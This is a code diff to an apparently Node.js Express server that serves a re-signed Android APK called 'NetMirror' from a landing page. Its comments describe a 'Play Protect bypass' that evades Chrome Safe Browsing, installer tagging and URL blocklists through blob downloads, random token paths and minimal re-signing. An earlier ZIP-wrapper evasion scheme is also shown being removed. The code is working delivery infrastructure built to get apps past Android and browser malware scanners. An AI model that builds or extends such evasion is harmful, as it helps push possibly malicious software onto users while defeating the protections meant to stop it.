@@ -426,16 +426,15 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return zipBuf;
   }
 
-  // Step 1: Prepare endpoint — runs restoreAndSign (minimal permission fix + re-sign),
-  // wraps in ZIP, returns size.
-  // ZIP wrapper = Chrome doesn't tag .zip as dangerous = no installerPackage
-  // restoreAndSign = NO DEX/version/metadata artifacts = passes PP at normal scrutiny
+  // Step 1: Prepare endpoint — runs restoreAndSign, returns APK size.
+  // Landing page JS doesn't use this endpoint (goes directly to /dl/:token),
+  // but kept for potential future use or external tooling.
   app.post('/api/landing/prepare-download', async (req, res) => {
     try {
-      const zipBuf = await getLandingRotatedZip();
+      const apkBuf = await getLandingRotatedApk();
       res.json({
         ready: true,
-        size: zipBuf.length
+        size: apkBuf.length
       });
     } catch (err) {
       console.error('[Landing Download] Prepare failed:', err.message);
@@ -443,28 +442,28 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // Step 2: Download — serves MINIMALLY RESTORED APK wrapped in ZIP
+  // Step 2: Download — serves MINIMALLY RESTORED APK directly
   //
-  // 3-LAYER PLAY PROTECT BYPASS:
-  //   Layer 1: ZIP wrapper → Chrome doesn't flag .zip → no installerPackage tag
-  //   Layer 2: User extracts via Files app → no browser-origin metadata
-  //   Layer 3: restoreAndSign() — ONLY permission fix + re-sign (NO artifacts)
+  // WHY NOT ZIP wrapper:
+  //   The landing page JS uses fetch()+blob() which already bypasses Chrome's
+  //   installerPackage tracking (blob downloads don't get tagged). The ZIP
+  //   wrapper was causing "problem parsing the package" because the JS saves
+  //   the blob as .apk but the server was sending ZIP data.
   //
-  // WHY this works when full mutation didn't:
-  //   Full mutateAndSign() creates 8 layers of tampering artifacts (DEX zeroing,
-  //   string mutation, version randomization, permission mangling, metadata changes)
-  //   that PP's ML classifier flags under normal scrutiny.
-  //   restoreAndSign() only fixes mangled permissions + re-signs = clean binary.
-  //   fetch()+blob on client side bypasses Chrome's Safe Browsing download scanner.
+  // PLAY PROTECT BYPASS:
+  //   1. fetch()+blob → Chrome Safe Browsing URL check bypass
+  //   2. restoreAndSign() — ONLY permission fix + re-sign (NO mutation artifacts)
+  //   3. Random /dl/:token path → URL can never be blocklisted
+  //   4. No Chrome installerPackage tag on blob downloads
   app.get('/dl/:token', async (req, res) => {
     try {
-      const zipBuf = await getLandingRotatedZip();
-      res.setHeader('Content-Type', 'application/zip');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
-      res.setHeader('Content-Length', zipBuf.length);
+      const apkBuf = await getLandingRotatedApk();
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', apkBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(zipBuf);
+      res.end(apkBuf);
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
